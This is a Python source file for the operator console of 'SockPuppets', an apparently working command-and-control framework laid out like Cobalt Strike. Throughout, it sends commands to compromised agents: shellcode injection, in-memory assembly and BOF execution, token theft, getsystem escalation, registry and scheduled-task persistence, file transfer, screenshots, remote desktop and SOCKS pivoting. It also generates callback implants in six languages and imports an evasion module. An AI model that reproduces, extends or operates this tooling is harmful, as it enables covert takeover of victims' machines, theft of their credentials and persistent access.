"""Main Textual application for SockPuppets TUI."""

import asyncio
import base64
import os
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Vertical, Horizontal
from textual.widgets import Header, Footer, TabbedContent, TabPane, Static, Input
from textual.timer import Timer

from tui.widgets import AgentTable, ConsolePanel, EventLogPanel, GenerateDialog, StatusBar


class SockPuppetsTUI(App):
    """SockPuppets Terminal UI — Cobalt Strike layout in the terminal."""

    TITLE = "SockPuppets"
    CSS = """
    #agent-panel { height: 1fr; }
    #bottom-panel { height: 1fr; }
    AgentTable { height: 100%; }
    EventLogPanel { height: 100%; }
    ConsolePanel { height: 1fr; }
    ConsolePanel > RichLog { height: 1fr; }
    ConsolePanel > Input { dock: bottom; margin-top: 1; }
    #status-bar { dock: bottom; height: 1; background: $surface; }
    .dialog-title { text-align: center; text-style: bold; padding: 1; }
    .label { width: 10; padding: 1; }
    .hint { padding: 1; color: $text-muted; }
    #generate-dialog { width: 60; height: 20; border: solid $primary; background: $surface; padding: 1; }
    """

    BINDINGS = [
        Binding("ctrl+q", "quit", "Quit", show=True),
        Binding("f1", "help", "Help"),
        Binding("f2", "generate", "Generate"),
        Binding("f5", "refresh", "Refresh"),
        Binding("f6", "kill_agent", "Kill"),
        Binding("f7", "sleep_agent", "Sleep"),
        Binding("f8", "upgrade_agent", "Upgrade"),
        Binding("f9", "downgrade_agent", "Downgrade"),
        Binding("f10", "socks_agent", "SOCKS"),
        Binding("f11", "desktop_agent", "Desktop"),
    ]

    def __init__(self, server, **kwargs):
        super().__init__(**kwargs)
        self.server = server
        self.event_queue = None
        self.console_tabs = {}

    def compose(self) -> ComposeResult:
        yield Header()
        yield Vertical(
            AgentTable(id="agent-table"),
            id="agent-panel",
        )
        with TabbedContent(id="bottom-panel"):
            with TabPane("Event Log", id="tab-event-log"):
                yield EventLogPanel(id="event-log")
        yield StatusBar(id="status-bar")
        yield Footer()

    def on_mount(self):
        self.event_queue = self.server.events.subscribe()
        self.set_interval(3.0, self.refresh_agents)
        self.set_interval(0.5, self.poll_events)
        self.refresh_agents()
        if hasattr(self.server, 'start_ws_events'):
            asyncio.ensure_future(self.server.start_ws_events())

    def refresh_agents(self):
        focused = self.focused
        if isinstance(focused, Input):
            return
        try:
            table = self.query_one("#agent-table", AgentTable)
            agents = self.server.get_agent_list()
            active_ids = {a["id"] for a in self.server.get_active_agents()}
            table.update_agents(agents, active_ids)

            running = hasattr(self.server, "ws_server") and self.server.ws_server is not None
            self.query_one("#status-bar", StatusBar).update_status(running, len(agents))
        except Exception:
            pass

    def poll_events(self):
        if not self.event_queue:
            return
        event_log = self.query_one("#event-log", EventLogPanel)
        while not self.event_queue.empty():
            try:
                event = self.event_queue.get_nowait()
                event_log.add_event(event.get("event", "unknown"), str(event))

                if event.get("event") == "agent_result":
                    agent_id = event.get("agent_id")
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append(event.get("output", ""), "white")
            except Exception:
                break

    def on_data_table_row_selected(self, event):
        agent_id = str(event.row_key.value)
        self.open_console(agent_id)

    def open_console(self, agent_id: str):
        if agent_id not in self.console_tabs:
            panel = ConsolePanel(agent_id, id=f"console-{agent_id}")
            pane = TabPane(f"Console: {agent_id}", panel, id=f"tab-console-{agent_id}")
            self.query_one("#bottom-panel", TabbedContent).add_pane(pane)
            self.console_tabs[agent_id] = panel

        self.query_one("#bottom-panel", TabbedContent).active = f"tab-console-{agent_id}"

        def _focus_input():
            try:
                self.console_tabs[agent_id].query_one(Input).focus()
            except Exception:
                pass

        self.set_timer(0.2, _focus_input)
        self.set_timer(0.5, _focus_input)

    def on_input_submitted(self, event: Input.Submitted):
        input_id = event.input.id or ""
        if input_id.startswith("console-input-"):
            agent_id = input_id.replace("console-input-", "")
            command = event.value.strip()
            if not command:
                return
            if command.startswith("desktop "):
                command = "__hd:" + command[8:]
            elif command.startswith("ls "):
                command = "__fs:ls:" + command[3:]
            elif command.startswith("get "):
                command = "__fs:get:" + command[4:]
            elif command.startswith("put "):
                parts = command.split(" ", 2)
                if len(parts) == 3:
                    from pathlib import Path
                    data = base64.b64encode(Path(parts[1]).read_bytes()).decode()
                    command = "__fs:put:" + parts[2] + "\t" + data
            elif command == "screenshot":
                command = "__px:screenshot"
            elif command == "getsystem":
                command = "__px:token:getsystem"
            elif command == "rev2self":
                command = "__px:token:rev2self"
            elif command.startswith("steal_token "):
                command = "__px:token:steal_token " + command[12:]
            elif command.startswith("make_token "):
                command = "__px:token:make_token " + command[11:]
            elif command.startswith("download "):
                command = "__px:download:" + command[9:]
            elif command.startswith("upload "):
                parts = command.split(" ", 2)
                if len(parts) == 3:
                    from pathlib import Path as _P
                    try:
                        data = base64.b64encode(_P(parts[1]).read_bytes()).decode()
                        command = f"__px:upload:{parts[2]}:{data}"
                    except FileNotFoundError:
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append(f"File not found: {parts[1]}", "red")
                        event.input.value = ""
                        return
                else:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append("Usage: upload <local_path> <remote_path>", "red")
                    event.input.value = ""
                    return
            elif command.startswith("shinject "):
                parts = command.split(None, 1)
                if len(parts) == 2 and os.path.exists(parts[1]):
                    sc_data = base64.b64encode(open(parts[1], "rb").read()).decode()
                    command = f"__shinject:{sc_data}"
                else:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append("Usage: shinject <path-to-shellcode.bin>", "red")
                    event.input.value = ""
                    return
            elif command.startswith("execute-assembly "):
                parts = command.split(None, 1)
                asm_parts = parts[1].split() if len(parts) > 1 else []
                if asm_parts and os.path.exists(asm_parts[0]):
                    asm_data = base64.b64encode(open(asm_parts[0], "rb").read()).decode()
                    asm_args = " ".join(asm_parts[1:])
                    command = f"__asm:{asm_args}:{asm_data}"
                else:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append("Usage: execute-assembly <path> [args]", "red")
                    event.input.value = ""
                    return
            elif command == "help":
                event.input.value = ""
                if agent_id in self.console_tabs:
                    self.console_tabs[agent_id].append(
                        "Commands: screenshot, getsystem, rev2self, steal_token <pid>,\n"
                        "  make_token <user> <pass>, persist [reg|schtask|remove],\n"
                        "  shinject <path>, execute-assembly <path> [args], bof <path>,\n"
                        "  upload <local> <remote>, download <path>, ls <path>,\n"
                        "  sleep <secs>, socks <port>, stopsocks, dormant <hours>,\n"
                        "  upgrade, downgrade [secs], kill, desktop <action>, results, help",
                        "cyan",
                    )
                return
            elif command == "results":
                event.input.value = ""
                try:
                    results_data = self.server.get_agent_results(agent_id, clear=False)
                    if not results_data:
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append("[*] No pending results", "yellow")
                    else:
                        for r in results_data:
                            if agent_id in self.console_tabs:
                                self.console_tabs[agent_id].append(
                                    f"[{r.get('command','')}] {r.get('output','')}", "white"
                                )
                except Exception as e:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append(f"Error: {e}", "red")
                return
            elif command == "stopsocks":
                event.input.value = ""
                if agent_id in self.console_tabs:
                    self.console_tabs[agent_id].append(f"agent[{agent_id}]> stopsocks", "bold cyan")
                asyncio.ensure_future(self._stop_socks(agent_id))
                return
            elif command.startswith("persist"):
                parts = command.split(None, 1)
                args = parts[1] if len(parts) > 1 else ""
                command = f"__px:persist:{args}".strip()
            elif command.startswith("sleep "):
                event.input.value = ""
                parts = command.split()
                if len(parts) == 2:
                    try:
                        interval = int(parts[1])
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append(f"agent[{agent_id}]> sleep {interval}", "bold cyan")
                        asyncio.ensure_future(self._set_sleep(agent_id, interval))
                    except ValueError:
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append("Invalid interval", "red")
                else:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append("Usage: sleep <seconds>", "red")
                return
            elif command.startswith("socks "):
                event.input.value = ""
                parts = command.split()
                if len(parts) >= 2:
                    try:
                        port = int(parts[1])
                        user = parts[2] if len(parts) > 2 else None
                        pwd = parts[3] if len(parts) > 3 else None
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append(f"agent[{agent_id}]> socks {port}", "bold cyan")
                        asyncio.ensure_future(self._start_socks(agent_id, port, user, pwd))
                    except ValueError:
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append("Invalid port", "red")
                else:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append("Usage: socks <port> [user pass]", "red")
                return
            elif command == "kill":
                event.input.value = ""
                if agent_id in self.console_tabs:
                    self.console_tabs[agent_id].append(f"agent[{agent_id}]> kill", "bold cyan")
                asyncio.ensure_future(self._kill_agent(agent_id))
                return
            elif command == "upgrade":
                event.input.value = ""
                if agent_id in self.console_tabs:
                    self.console_tabs[agent_id].append(f"agent[{agent_id}]> upgrade", "bold cyan")
                asyncio.ensure_future(self._upgrade_agent(agent_id))
                return
            elif command.startswith("downgrade"):
                event.input.value = ""
                parts = command.split()
                interval = int(parts[1]) if len(parts) > 1 else 60
                if agent_id in self.console_tabs:
                    self.console_tabs[agent_id].append(f"agent[{agent_id}]> downgrade {interval}", "bold cyan")
                asyncio.ensure_future(self._downgrade_agent(agent_id, interval))
                return
            elif command.startswith("dormant "):
                event.input.value = ""
                parts = command.split()
                if len(parts) == 2:
                    try:
                        hours = float(parts[1])
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append(f"agent[{agent_id}]> dormant {hours}", "bold cyan")
                        asyncio.ensure_future(self._send_command(agent_id, f"__dormant:{hours}"))
                    except ValueError:
                        if agent_id in self.console_tabs:
                            self.console_tabs[agent_id].append("Invalid hours value", "red")
                return
            elif command.startswith("bof "):
                event.input.value = ""
                bof_parts = command.split(None, 1)
                if len(bof_parts) < 2:
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append("Usage: bof <path-to-.o> [type:value ...]", "red")
                    return
                bof_args_raw = bof_parts[1].split()
                bof_path = bof_args_raw[0]
                bof_cli_args = bof_args_raw[1:] if len(bof_args_raw) > 1 else []
                if not os.path.exists(bof_path):
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append(f"BOF file not found: {bof_path}", "red")
                    return
                if agent_id in self.console_tabs:
                    self.console_tabs[agent_id].append(f"agent[{agent_id}]> bof {os.path.basename(bof_path)}", "bold cyan")
                asyncio.ensure_future(self._send_bof(agent_id, bof_path, bof_cli_args))
                return
            event.input.value = ""

            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"agent[{agent_id}]> {command}", "bold cyan")

            asyncio.ensure_future(self._send_command(agent_id, command))

    async def _send_command(self, agent_id: str, command: str):
        try:
            result = await self.server.send_command_to_agent(agent_id, command)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "white")
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    async def _send_bof(self, agent_id: str, bof_path: str, bof_cli_args: list):
        try:
            with open(bof_path, "rb") as f:
                bof_data = base64.b64encode(f.read()).decode()
            bof_args = ""
            if bof_cli_args:
                from evasion.bof_packer import parse_bof_args
                bof_args = base64.b64encode(parse_bof_args(bof_cli_args)).decode()
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"[*] Loading BOF: {os.path.basename(bof_path)}", "bold green")
            result = await self.server.send_bof_to_agent(agent_id, bof_data, bof_args)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "white")
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"BOF error: {e}", "red")

    async def _set_sleep(self, agent_id: str, interval: int):
        try:
            result = await self.server.set_beacon_interval(agent_id, interval)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "green")
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    async def _start_socks(self, agent_id: str, port: int, user=None, pwd=None):
        try:
            result = await self.server.start_socks_proxy(agent_id, port, user, pwd)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "green")
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    async def _stop_socks(self, agent_id: str):
        try:
            result = await self.server.stop_socks_proxy(agent_id)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "green")
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    async def _kill_agent(self, agent_id: str):
        try:
            result = await self.server.kill_agent(agent_id)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "yellow")
            self.refresh_agents()
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    async def _upgrade_agent(self, agent_id: str):
        try:
            result = await self.server.upgrade_to_streaming(agent_id)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "green")
            self.refresh_agents()
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    async def _downgrade_agent(self, agent_id: str, interval: int = 60):
        try:
            result = await self.server.downgrade_to_beacon(agent_id, interval)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "green")
            self.refresh_agents()
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    def _get_selected_agent_id(self) -> str | None:
        table = self.query_one("#agent-table", AgentTable)
        if table.cursor_row is not None and table.row_count > 0:
            try:
                row = table.ordered_rows[table.cursor_row]
                return str(row.key.value)
            except (IndexError, AttributeError):
                return None
        return None

    async def action_kill_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.kill_agent(agent_id)
            self.query_one("#event-log", EventLogPanel).add_event("kill", result)
            self.refresh_agents()

    async def action_sleep_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.set_beacon_interval(agent_id, 60)
            self.query_one("#event-log", EventLogPanel).add_event("sleep", result)

    async def action_upgrade_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.upgrade_to_streaming(agent_id)
            self.query_one("#event-log", EventLogPanel).add_event("upgrade", result)
            self.refresh_agents()

    async def action_downgrade_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.downgrade_to_beacon(agent_id, 60)
            self.query_one("#event-log", EventLogPanel).add_event("downgrade", result)
            self.refresh_agents()

    async def action_desktop_agent(self):
        agent_id = self._get_selected_agent_id()
        if not agent_id:
            agents = self.server.get_agent_list()
            if agents:
                agent_id = agents[0]["id"]
        if not agent_id:
            return
        self.open_console(agent_id)
        result = await self.server.send_command_to_agent(agent_id, "__hd:frame")
        text = result if not str(result).startswith("HDIMG:") else f"desktop frame {len(result)} bytes"
        self.console_tabs[agent_id].append(text, "white")

    async def action_generate(self):
        result = await self.push_screen_wait(GenerateDialog())
        if result:
            try:
                from agent import AgentGenerator
                gen = AgentGenerator(patterns=result.get("patterns", "default"))
                host = result["host"]
                port = int(result["port"])
                lang = result.get("lang", "all")
                transport = result.get("transport", "websocket")
                profile = result.get("profile", "default")
                event_log = self.query_one("#event-log", EventLogPanel)
                results = {}

                if lang in ("python", "all"):
                    results.update(gen.generate_all(c2_host=host, c2_port=port,
                                                     profile=profile, transport=transport))
                if lang in ("go", "all"):
                    try:
                        results["go"] = gen.generate_go_agent(host, port, transport=transport)
                    except Exception as e:
                        results["go"] = f"Error: {e}"
                if lang in ("rust", "all"):
                    try:
                        results["rust"] = gen.generate_rust_agent(host, port, transport=transport)
                    except Exception as e:
                        results["rust"] = f"Error: {e}"
                if lang in ("csharp", "all"):
                    try:
                        results["csharp"] = gen.generate_csharp_agent(host, port, transport=transport)
                    except Exception as e:
                        results["csharp"] = f"Error: {e}"
                if lang in ("powershell", "all"):
                    try:
                        results["powershell"] = gen.generate_powershell_agent(host, port, transport=transport)
                    except Exception as e:
                        results["powershell"] = f"Error: {e}"
                if lang in ("c", "all"):
                    try:
                        results["c"] = gen.generate_c_agent(host, port, transport=transport)
                    except Exception as e:
                        results["c"] = f"Error: {e}"

                for agent_type, path in results.items():
                    event_log.add_event("generate", f"{agent_type}: {path}")
            except Exception as e:
                self.query_one("#event-log", EventLogPanel).add_event("error", str(e))

    def action_help(self):
        help_text = (
            "SockPuppets TUI — Keybindings\n"
            "─────────────────────────────\n"
            "F1   Help         F2   Generate payload\n"
            "F5   Refresh      F6   Kill agent\n"
            "F7   Sleep (60s)  F8   Upgrade to streaming\n"
            "F9   Downgrade    F10  SOCKS proxy\n"
            "F11  Desktop      Ctrl+Q  Quit\n\n"
            "Double-click a row to open a console tab.\n"
            "Console commands: screenshot, upload, download,\n"
            "  shinject, execute-assembly, persist, sleep,\n"
            "  socks, kill, upgrade, downgrade, dormant,\n"
            "  desktop, ls, get, put, bof"
        )
        self.query_one("#event-log", EventLogPanel).add_event("help", help_text)

    async def action_socks_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.start_socks_proxy(agent_id, 1080)
            self.query_one("#event-log", EventLogPanel).add_event("socks", result)

    def action_refresh(self):
        self.refresh_agents()
